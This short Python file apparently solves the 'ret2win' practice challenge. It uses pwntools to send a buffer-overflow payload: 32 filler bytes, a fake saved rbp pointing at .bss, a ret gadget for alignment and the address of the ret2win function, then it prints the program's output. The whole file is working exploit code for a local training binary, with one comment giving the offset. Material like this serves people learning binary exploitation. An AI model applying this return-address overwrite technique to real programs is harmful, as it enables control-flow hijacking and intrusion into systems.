from pwn import * 

elf=ELF("ret2win")
r=ROP([elf])
p=process(elf.path)
ret = r.find_gadget(["ret"])[0]


p.recvuntil(b'>')
#32 for buffer,8 for rbp plus a ret for allignment
payload=b'Y'*32
payload+=p64(elf.bss())
payload+=p64(ret)
payload+=p64(elf.sym.ret2win)
p.send(payload)
print(p.stream())